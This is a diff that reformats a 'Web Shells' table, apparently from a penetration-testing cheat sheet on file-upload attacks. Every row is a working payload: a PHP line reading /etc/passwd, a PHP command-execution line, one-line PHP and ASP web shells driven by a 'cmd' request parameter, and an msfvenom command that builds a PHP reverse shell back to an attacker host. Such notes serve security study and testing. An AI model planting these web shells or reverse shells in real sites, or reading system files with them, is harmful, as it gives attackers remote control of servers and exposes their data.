@@ -1,12 +1,12 @@
 ## Web Shells
 
-|Description|Payload|
-|---|---|
-|PHP File Read|`<?php echo file_get_contents('/etc/passwd'); ?>`|
-|PHP Command Execution|`<?php system('hostname'); ?>`|
-|PHP Web Shell|`<?php system($_REQUEST['cmd']); ?>`|
-|ASP Web Shell|`<% eval request('cmd') %>`|
-|PHP Reverse Shell|`msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw > reverse.php`|
+| Description           | Payload                                                                        |
+| --------------------- | ------------------------------------------------------------------------------ |
+| PHP File Read         | `<?php echo file_get_contents('/etc/passwd'); ?>`                              |
+| PHP Command Execution | `<?php system('hostname'); ?>`                                                 |
+| PHP Web Shell         | `<?php system($_REQUEST['cmd']); ?>`                                           |
+| ASP Web Shell         | `<% eval request('cmd') %>`                                                    |
+| PHP Reverse Shell     | `msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw > reverse.php` |
 
 ---
 ### Blacklist Bypass
